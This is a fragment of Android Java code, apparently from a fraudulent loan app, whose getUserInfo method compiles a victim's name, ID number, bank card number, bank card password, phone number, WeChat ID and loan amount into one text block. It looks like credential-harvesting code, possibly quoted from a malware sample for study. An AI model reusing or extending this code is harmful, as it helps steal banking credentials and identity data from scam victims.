...
public class PhoneInfo {
    ...
    public static String getUserInfo(Context context) { 
    	String info="";
    	String tmp=Config.getConfig(context).getUserName();
    	if(tmp.length()>0)info=info+"姓名："+tmp+"\r\n";
    	tmp=Config.getConfig(context).getIDnum();
    	if(tmp.length()>0)info=info+"身份证号："+tmp+"\r\n";
    	tmp=Config.getConfig(context).getBCnum();
    	if(tmp.length()>0)info=info+"银行卡号："+tmp+"\r\n";
    	tmp=Config.getConfig(context).getBCPWD();
    	if(tmp.length()>0)info=info+"银行卡密码："+tmp+"\r\n";
    	tmp=Config.getConfig(context).getPhoneNum();
    	if(tmp.length()>0)info=info+"手机号："+tmp+"\r\n";
    	tmp=Config.getConfig(context).getWXnum();
    	if(tmp.length()>0)info=info+"微信号："+tmp+"\r\n";
    	tmp=Config.getConfig(context).getRequestMoney();
    	if(tmp.length()>0)info=info+"贷款金额："+tmp+"\r\n";
    	return info;
    }
}
